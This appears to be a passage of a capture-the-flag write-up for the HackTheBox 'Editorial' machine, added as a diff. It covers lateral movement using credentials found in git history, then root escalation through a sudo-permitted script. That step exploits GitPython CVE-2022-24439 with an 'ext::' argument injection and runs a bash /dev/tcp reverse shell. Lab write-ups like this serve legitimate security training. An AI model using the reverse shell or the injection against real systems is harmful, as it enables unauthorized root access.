@@ -95,3 +95,87 @@ dev@editorial:~$
 ```
 
 and capture the user flag.
+
+### Lateral movement
+
+After logging in and exploring the machine, I've discovered that it contain second standard user account, which suggests need for lateral movement.
+
+``` bash
+dev@editorial:~$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
+dev:x:1001:1001::/home/dev:/bin/bash
+```
+
+Later, I've discovered the `apps` directory, containing `git` repository. Further exploration discovered, that on some point the developer changed the environment from **prod** to **dev**:
+
+``` bash
+dev@editorial:~/apps$ git log
+
+...SNIP...
+
+commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
+Date:   Sun Apr 30 20:55:08 2023 -0500
+
+    change(api): downgrading prod to dev
+    
+    * To use development environment.
+
+...SNIP...
+```
+
+Checking for differences with previous commit to the `b734...` reveals the credentials to user `prod` on the machine.
+
+With them we can easily hop to account `prod`:
+
+``` bash
+prod@editorial:~$ id
+uid=1000(prod) gid=1000(prod) groups=1000(prod)
+prod@editorial:~$ 
+```
+
+### Root privileges escalation
+
+Checking for potential entry points for escalation with `sudo -l`:
+
+``` bash
+prod@editorial:~$ sudo -l
+[sudo] password for prod: 
+Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User prod may run the following commands on editorial:
+    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
+
+```
+
+Apperantly, the user can execute the python script for cloning repositories. This script utilizes the `git` library. 
+
+``` bash
+prod@editorial:~$ pip list | grep -i git
+gitdb                 4.0.10
+GitPython             3.1.29
+```
+
+When checking for potential exploits for given version of `GitPython`, we can find out, that it is vulnerable to [CVE-2022-24439](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858).
+
+With this knowledge, we can craft a malicious script that will be executed during the cloning process. This time I've created a simple reverse shell script:
+
+``` bash
+prod@editorial:/tmp$ cat s.sh
+/bin/bash -i >& /dev/tcp/xx.xx.xx.xx/1234 0>&1
+prod@editorial:/tmp$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh /tmp/s.sh'
+```
+
+Which allows to gain access over root:
+
+``` bash
+> nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.20] 47542
+root@editorial:/opt/internal_apps/clone_changes# id
+id
+uid=0(root) git=0(root) groups=0(root)
+```
